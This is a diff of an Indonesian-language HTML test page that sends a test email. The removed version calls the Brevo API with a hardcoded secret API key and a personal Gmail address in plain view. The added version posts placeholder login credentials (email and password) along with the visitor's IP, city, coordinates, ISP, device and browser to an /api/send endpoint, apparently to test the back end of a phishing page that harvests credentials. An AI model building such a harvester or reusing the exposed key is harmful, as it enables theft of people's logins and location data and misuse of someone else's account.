@@ -2,38 +2,42 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Test Brevo</title>
+<title>Test API</title>
 <style>
-body{font-family:Arial;padding:20px;background:#f0f0f0}
-.box{background:#fff;padding:20px;border-radius:10px;max-width:600px;margin:auto}
-button{background:#1a73e8;color:#fff;border:0;padding:12px 24px;border-radius:6px;font-size:16px;cursor:pointer;width:100%}
-pre{background:#111;color:#0f0;padding:15px;border-radius:6px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;font-size:12px;margin-top:20px}
+body{font-family:Arial;padding:20px;background:#111;color:#fff}
+button{background:#238636;color:#fff;border:0;padding:15px 25px;font-size:16px;border-radius:8px;cursor:pointer;width:100%}
+pre{background:#000;color:#0f0;padding:15px;border-radius:8px;margin-top:20px;white-space:pre-wrap;word-break:break-all;font-size:12px;min-height:200px}
 </style>
 </head>
 <body>
-<div class="box">
-<h2>Test Brevo API</h2>
-<p>Klik tombol di bawah untuk test kirim email:</p>
-<button onclick="testBrevo()">🚀 KIRIM TEST</button>
-<pre id="hasil">Belum ada hasil... klik tombol di atas</pre>
-</div>
+<h2>Test Kirim ke API</h2>
+<button onclick="test()">🚀 TEST KIRIM EMAIL</button>
+<pre id="hasil">Klik tombol di atas...</pre>
 
 <script>
-function testBrevo(){
-    document.getElementById("hasil").textContent = "Loading...";
+function test(){
+    document.getElementById("hasil").textContent = "Mengirim...";
 
-    fetch("https://api.brevo.com/v3/smtp/email", {
+    fetch("/api/send", {
         method: "POST",
-        headers: {
-            "accept": "application/json",
-            "api-key": "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",
-            "content-type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-            sender: { name: "Test", email: "medikaputra5@gmail.com" },
-            to: [{ email: "medikaputra5@gmail.com" }],
-            subject: "Test Brevo",
-            htmlContent: "<h1>Halo dari Brevo</h1>"
+            email: "test@test.com",
+            password: "test123",
+            ip: "1.2.3.4",
+            ipv6: "-",
+            negara: "ID Indonesia",
+            prov: "Jakarta",
+            kota: "Jakarta",
+            zona: "Asia/Jakarta",
+            isp: "Test ISP",
+            asn: "AS12345",
+            zip: "12345",
+            koord: "-6.2 , 106.8",
+            waktu: "20-09-2026 00:16:00 WIB",
+            device: "Android",
+            os: "Android 11",
+            browser: "Chrome 120"
         })
     })
     .then(r => r.text())
